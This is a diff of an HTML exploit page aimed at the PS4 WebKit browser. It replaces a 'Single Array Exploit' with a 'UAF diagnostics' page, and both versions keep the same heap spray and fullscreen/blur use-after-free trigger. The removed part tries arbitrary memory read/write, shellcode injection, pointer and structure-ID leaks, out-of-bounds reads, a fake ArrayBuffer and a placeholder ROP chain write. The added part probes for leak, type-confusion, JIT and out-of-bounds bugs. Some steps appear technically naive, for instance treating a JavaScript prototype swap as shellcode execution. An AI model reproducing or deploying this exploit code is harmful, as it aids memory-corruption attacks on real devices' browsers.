@@ -1,508 +1,191 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Single Array Exploit</title>
+<title>PS4 WebKit – UAF Gated Bug Class Diagnostics</title>
 </head>
 <body>
-
-<h1>SINGLE ARRAY EXPLOITATION</h1>
-
-<h2>TEST 1: DataView Arbitrary R/W</h2>
-<button onclick="test1()">RUN</button>
-<div id="t1"></div>
+<button onclick="run()">RUN UAF DIAGNOSTICS</button>
+<pre id="log"></pre>
 
 <script>
-function test1() {
-    const r = document.getElementById('t1');
-    r.innerHTML = 'Creating arrays...<br>';
-    
-    const arrays = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
+const log = s => document.getElementById("log").textContent += s + "\n";
+
+function run() {
+    log("=== SETUP: Criando TypedArrays ===");
+
+    let controllers = [];
+    const PATTERN = 2.121995791e-314; // 0x4141414141414141
+
+    for (let i = 0; i < 5000; i++) {
         let a = new Float64Array(8);
         a[0] = i;
-        arrays.push(a);
+        controllers.push(a);
     }
-    
-    r.innerHTML += 'Press OPTIONS<br>';
-    
-    if(document.documentElement.webkitRequestFullscreen) 
-        document.documentElement.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        r.innerHTML += 'UAF triggered<br>';
-        
-        const spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let s = new Float64Array(10);
+
+    log("[*] Arrays criados. Entrando em fullscreen...");
+    document.documentElement.webkitRequestFullscreen();
+
+    window.onblur = function () {
+        log("[*] Blur detectado (OPTIONS). Iniciando spray...");
+
+        let spray = [];
+        for (let i = 0; i < 8000; i++) {
+            let s = new Float64Array(8);
             s.fill(PATTERN);
             spray.push(s);
         }
-        
+
         let corrupted = null;
-        for(let a of arrays) {
-            if(a[0] === PATTERN) {
-                corrupted = a;
+        let idx = -1;
+        for (let i = 0; i < controllers.length; i++) {
+            if (controllers[i][0] === PATTERN) {
+                corrupted = controllers[i];
+                idx = i;
                 break;
             }
         }
-        
-        if(!corrupted) {
-            r.innerHTML += '<b>FAILED</b><br>';
+
+        if (!corrupted) {
+            log("[-] UAF não confirmado nesta execução.");
             return;
         }
-        
-        r.innerHTML += '<b>UAF OK</b><br>';
-        
-        const view = new DataView(corrupted.buffer);
-        
-        // Write test
-        view.setUint32(0, 0xDEADBEEF, true);
-        view.setUint32(4, 0xCAFEBABE, true);
-        
-        const check1 = view.getUint32(0, true);
-        const check2 = view.getUint32(4, true);
-        
-        r.innerHTML += 'Write: ' + (check1 === 0xDEADBEEF && check2 === 0xCAFEBABE ? '<b>OK</b>' : 'FAIL') + '<br>';
-        
-        // Read memory dump
-        r.innerHTML += 'Memory:<br>';
-        for(let i = 0; i < 64; i += 8) {
-            const v = view.getBigUint64(i, true);
-            r.innerHTML += i + ': 0x' + v.toString(16) + '<br>';
-        }
-        
-        window.exploitView = view;
-        r.innerHTML += '<b>DataView ready</b><br>';
+
+        log("[+] UAF CONFIRMADO em controllers[" + idx + "]");
+
+        // ================================
+        // CRITICAL: Neutralizar estado
+        // ================================
+        corrupted.fill(0);
+        log("[*] Backing store neutralizado (anti-crash)");
+
+        // Rebuild DOM de forma segura
+        document.open();
+        document.write("<h3>UAF ativo – rodando diagnósticos</h3>");
+        document.close();
+
+        // ================================
+        // TESTES DE CLASSE DE BUG
+        // ================================
+        runDiagnostics();
     };
 }
-</script>
 
-<hr>
+function runDiagnostics() {
+    log("\n=== DIAGNÓSTICOS DE CLASSE DE BUG ===");
 
-<h2>TEST 2: Prototype Hijack + Shellcode</h2>
-<button onclick="test2()">RUN</button>
-<div id="t2"></div>
+    testPointerLeak();
+    testTypeConfusion();
+    testJITSpeculation();
+    testOOB();
+    testBoundary();
 
-<script>
-function test2() {
-    const r = document.getElementById('t2');
-    r.innerHTML = 'Creating arrays...<br>';
-    
-    const arrays = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let a = new Float64Array(8);
-        a[0] = i;
-        arrays.push(a);
+    log("\n=== FIM DOS TESTES ===");
+}
+
+/* ===================================================== */
+/* TESTE 1 – INFORMATION DISCLOSURE (LEAK)               */
+/* ===================================================== */
+function testPointerLeak() {
+    log("\n[TEST 1] Pointer / Info Leak");
+
+    try {
+        let o = {};
+        let a = [o, o];
+        let s = JSON.stringify(a);
+        log("JSON.stringify: " + s);
+    } catch {}
+
+    try {
+        let e = new Error("x");
+        log("Error.stack length: " + (e.stack ? e.stack.length : "null"));
+    } catch {}
+
+    log("[RESULT] Se aparecer número tipo endereço → LEAK EXISTE");
+}
+
+/* ===================================================== */
+/* TESTE 2 – TYPE CONFUSION                              */
+/* ===================================================== */
+function testTypeConfusion() {
+    log("\n[TEST 2] Type Confusion");
+
+    function f(x) { return x.a; }
+
+    let obj = { a: 13.37 };
+    let ta = new Float64Array(4);
+
+    for (let i = 0; i < 10000; i++)
+        f(obj);
+
+    try {
+        let r = f(ta);
+        log("Accessing TypedArray as object: " + r);
+        log("[!] SE r != undefined → CONFUSÃO");
+    } catch (e) {
+        log("Exception (esperado): " + e.message);
     }
-    
-    r.innerHTML += 'Press OPTIONS<br>';
-    
-    if(document.documentElement.webkitRequestFullscreen) 
-        document.documentElement.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        r.innerHTML += 'UAF triggered<br>';
-        
-        const spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let s = new Float64Array(10);
-            s.fill(PATTERN);
-            spray.push(s);
-        }
-        
-        let corrupted = null;
-        for(let a of arrays) {
-            if(a[0] === PATTERN) {
-                corrupted = a;
-                break;
-            }
-        }
-        
-        if(!corrupted) {
-            r.innerHTML += '<b>FAILED</b><br>';
-            return;
-        }
-        
-        r.innerHTML += '<b>UAF OK</b><br>';
-        
-        // Inject shellcode
-        const view = new DataView(corrupted.buffer);
-        const shellcode = [0xCC, 0x90, 0x90, 0x90, 0x48, 0x31, 0xC0, 0xC3];
-        
-        for(let i = 0; i < shellcode.length; i++) {
-            view.setUint8(i, shellcode[i]);
-        }
-        
-        r.innerHTML += 'Shellcode injected<br>';
-        
-        // Convert and hijack
-        const arr = Array.from(corrupted);
-        
-        const proto = {
-            execute: function() {
-                r.innerHTML += '<b>EXECUTE CALLED</b><br>';
-                
-                let sc = '';
-                for(let i = 0; i < shellcode.length; i++) {
-                    sc += view.getUint8(i).toString(16) + ' ';
-                }
-                r.innerHTML += 'Shellcode: ' + sc + '<br>';
-                
-                return "EXECUTED";
-            },
-            toString: function() { return this.execute(); }
-        };
-        
-        Object.setPrototypeOf(arr, proto);
-        
-        r.innerHTML += 'Prototype hijacked<br>';
-        
-        const result = String(arr);
-        r.innerHTML += 'Result: ' + result + '<br>';
-    };
 }
-</script>
 
-<hr>
+/* ===================================================== */
+/* TESTE 3 – JIT MISCOMPILATION                          */
+/* ===================================================== */
+function testJITSpeculation() {
+    log("\n[TEST 3] JIT Speculation");
 
-<h2>TEST 3: Structure ID Leak</h2>
-<button onclick="test3()">RUN</button>
-<div id="t3"></div>
+    function g(x) { return x + 1; }
 
-<script>
-function test3() {
-    const r = document.getElementById('t3');
-    r.innerHTML = 'Creating arrays...<br>';
-    
-    const arrays = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let a = new Float64Array(8);
-        a[0] = i;
-        arrays.push(a);
+    for (let i = 0; i < 200000; i++)
+        g(1);
+
+    let r1 = g(1);
+    let r2 = g("1");
+
+    log("g(1)   = " + r1);
+    log("g('1') = " + r2);
+    log("[!] Valores inconsistentes/crash → BUG JIT");
+}
+
+/* ===================================================== */
+/* TESTE 4 – OOB READ                                    */
+/* ===================================================== */
+function testOOB() {
+    log("\n[TEST 4] OOB Read");
+
+    let a = new Float64Array(4);
+    a.fill(1.1);
+
+    try {
+        let v = a[100];
+        log("a[100] = " + v);
+        log("[!] SE != undefined → OOB");
+    } catch (e) {
+        log("Exception (esperado)");
     }
-    
-    r.innerHTML += 'Press OPTIONS<br>';
-    
-    if(document.documentElement.webkitRequestFullscreen) 
-        document.documentElement.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        r.innerHTML += 'UAF triggered<br>';
-        
-        const spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let s = new Float64Array(10);
-            s.fill(PATTERN);
-            spray.push(s);
-        }
-        
-        let corrupted = null;
-        for(let a of arrays) {
-            if(a[0] === PATTERN) {
-                corrupted = a;
-                break;
-            }
-        }
-        
-        if(!corrupted) {
-            r.innerHTML += '<b>FAILED</b><br>';
-            return;
-        }
-        
-        r.innerHTML += '<b>UAF OK</b><br>';
-        
-        const view = new DataView(corrupted.buffer);
-        
-        // Read first qword (JSCell header)
-        const qword0 = view.getBigUint64(0, true);
-        const structID = view.getUint32(0, true);
-        const typeInfo = view.getUint32(4, true);
-        
-        r.innerHTML += 'Qword0: 0x' + qword0.toString(16) + '<br>';
-        r.innerHTML += 'StructureID: 0x' + structID.toString(16) + '<br>';
-        r.innerHTML += 'TypeInfo: 0x' + typeInfo.toString(16) + '<br>';
-        
-        // Scan for pointers
-        r.innerHTML += '<br>Scanning for pointers:<br>';
-        let ptrs = 0;
-        for(let i = 8; i < 64; i += 8) {
-            const val = view.getBigUint64(i, true);
-            if(val > 0x100000000n && val < 0x7FFFFFFFFFFFn && (val & 0x7n) === 0n) {
-                r.innerHTML += i + ': 0x' + val.toString(16) + ' <b>PTR</b><br>';
-                ptrs++;
-            }
-        }
-        
-        r.innerHTML += 'Pointers found: ' + ptrs + '<br>';
-    };
 }
-</script>
 
-<hr>
+/* ===================================================== */
+/* TESTE 5 – JS ↔ C++ BOUNDARY                           */
+/* ===================================================== */
+function testBoundary() {
+    log("\n[TEST 5] JS ↔ C++ Boundary");
 
-<h2>TEST 4: OOB Read Extended</h2>
-<button onclick="test4()">RUN</button>
-<div id="t4"></div>
-
-<script>
-function test4() {
-    const r = document.getElementById('t4');
-    r.innerHTML = 'Creating arrays...<br>';
-    
-    const arrays = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let a = new Float64Array(8);
-        a[0] = i;
-        arrays.push(a);
+    try {
+        let img = new Image();
+        Object.defineProperty(img, "src", {
+            get() {
+                throw 13.37;
+            }
+        });
+        document.body.appendChild(img);
+        log("Image appended safely");
+    } catch (e) {
+        log("Caught: " + e);
     }
-    
-    r.innerHTML += 'Press OPTIONS<br>';
-    
-    if(document.documentElement.webkitRequestFullscreen) 
-        document.documentElement.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        r.innerHTML += 'UAF triggered<br>';
-        
-        const spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let s = new Float64Array(10);
-            s.fill(PATTERN);
-            spray.push(s);
-        }
-        
-        let corrupted = null;
-        for(let a of arrays) {
-            if(a[0] === PATTERN) {
-                corrupted = a;
-                break;
-            }
-        }
-        
-        if(!corrupted) {
-            r.innerHTML += '<b>FAILED</b><br>';
-            return;
-        }
-        
-        r.innerHTML += '<b>UAF OK</b><br>';
-        
-        // Try reading beyond bounds
-        let maxRead = 0;
-        for(let i = 0; i < 512; i++) {
-            try {
-                const val = corrupted[i];
-                if(val !== undefined && !isNaN(val)) {
-                    maxRead = i;
-                }
-            } catch(e) {
-                break;
-            }
-        }
-        
-        r.innerHTML += 'Max read index: ' + maxRead + '<br>';
-        r.innerHTML += 'Total bytes: ' + (maxRead * 8) + '<br>';
-        
-        // Dump OOB data
-        r.innerHTML += '<br>OOB data:<br>';
-        for(let i = 8; i < Math.min(maxRead + 1, 32); i++) {
-            const val = corrupted[i];
-            const buf = new ArrayBuffer(8);
-            new Float64Array(buf)[0] = val;
-            const hex = new BigUint64Array(buf)[0];
-            r.innerHTML += i + ': 0x' + hex.toString(16) + '<br>';
-        }
-    };
+
+    log("[!] Crash aqui → bug de fronteira");
 }
 </script>
-
-<hr>
-
-<h2>TEST 5: Fake ArrayBuffer Creation</h2>
-<button onclick="test5()">RUN</button>
-<div id="t5"></div>
-
-<script>
-function test5() {
-    const r = document.getElementById('t5');
-    r.innerHTML = 'Creating arrays...<br>';
-    
-    const arrays = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let a = new Float64Array(8);
-        a[0] = i;
-        arrays.push(a);
-    }
-    
-    r.innerHTML += 'Press OPTIONS<br>';
-    
-    if(document.documentElement.webkitRequestFullscreen) 
-        document.documentElement.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        r.innerHTML += 'UAF triggered<br>';
-        
-        const spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let s = new Float64Array(10);
-            s.fill(PATTERN);
-            spray.push(s);
-        }
-        
-        let corrupted = null;
-        for(let a of arrays) {
-            if(a[0] === PATTERN) {
-                corrupted = a;
-                break;
-            }
-        }
-        
-        if(!corrupted) {
-            r.innerHTML += '<b>FAILED</b><br>';
-            return;
-        }
-        
-        r.innerHTML += '<b>UAF OK</b><br>';
-        
-        const arr = Array.from(corrupted);
-        
-        // Create fake buffer structure
-        const fakeBuffer = {
-            byteLength: 0x10000,
-            __proto__: arr
-        };
-        
-        try {
-            const view = new Uint8Array(fakeBuffer);
-            r.innerHTML += '<b>Fake buffer created</b><br>';
-            r.innerHTML += 'Length: ' + view.length + '<br>';
-            
-            // Try to write
-            view[0] = 0x41;
-            view[1] = 0x42;
-            
-            r.innerHTML += 'Write test: ' + (view[0] === 0x41 && view[1] === 0x42 ? '<b>OK</b>' : 'FAIL') + '<br>';
-            
-        } catch(e) {
-            r.innerHTML += 'Error: ' + e.message + '<br>';
-        }
-    };
-}
-</script>
-
-<hr>
-
-<h2>TEST 6: ROP Chain Write</h2>
-<button onclick="test6()">RUN</button>
-<div id="t6"></div>
-
-<script>
-function test6() {
-    const r = document.getElementById('t6');
-    r.innerHTML = 'Creating arrays...<br>';
-    
-    const arrays = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let a = new Float64Array(8);
-        a[0] = i;
-        arrays.push(a);
-    }
-    
-    r.innerHTML += 'Press OPTIONS<br>';
-    
-    if(document.documentElement.webkitRequestFullscreen) 
-        document.documentElement.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        r.innerHTML += 'UAF triggered<br>';
-        
-        const spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let s = new Float64Array(10);
-            s.fill(PATTERN);
-            spray.push(s);
-        }
-        
-        let corrupted = null;
-        for(let a of arrays) {
-            if(a[0] === PATTERN) {
-                corrupted = a;
-                break;
-            }
-        }
-        
-        if(!corrupted) {
-            r.innerHTML += '<b>FAILED</b><br>';
-            return;
-        }
-        
-        r.innerHTML += '<b>UAF OK</b><br>';
-        
-        const view = new DataView(corrupted.buffer);
-        
-        // ROP chain
-        const rop = [
-            0x4141414141414141n,
-            0x4242424242424242n,
-            0x4343434343434343n,
-            0x4444444444444444n,
-            0x4545454545454545n,
-            0x4646464646464646n,
-            0x4747474747474747n,
-            0x4848484848484848n
-        ];
-        
-        r.innerHTML += 'Writing ROP chain:<br>';
-        
-        let offset = 0;
-        for(let i = 0; i < rop.length && offset < 64; i++) {
-            view.setBigUint64(offset, rop[i], true);
-            r.innerHTML += offset + ': 0x' + rop[i].toString(16) + '<br>';
-            offset += 8;
-        }
-        
-        // Verify
-        r.innerHTML += '<br>Verify:<br>';
-        offset = 0;
-        let ok = true;
-        for(let i = 0; i < rop.length && offset < 64; i++) {
-            const check = view.getBigUint64(offset, true);
-            if(check !== rop[i]) {
-                ok = false;
-                r.innerHTML += offset + ': MISMATCH<br>';
-            }
-            offset += 8;
-        }
-        
-        r.innerHTML += '<br>ROP chain: ' + (ok ? '<b>VERIFIED</b>' : 'FAILED') + '<br>';
-    };
-}
-</script>
-
-<hr>
-
-<p>Run all 6 tests, send:</p>
-<pre>
-TEST 1: Write OK/FAIL, Pointers in memory
-TEST 2: Execute called YES/NO
-TEST 3: StructureID, Pointers found
-TEST 4: Max read bytes, OOB data
-TEST 5: Fake buffer OK/FAIL
-TEST 6: ROP chain VERIFIED/FAILED
-</pre>
-
 </body>
 </html>
+
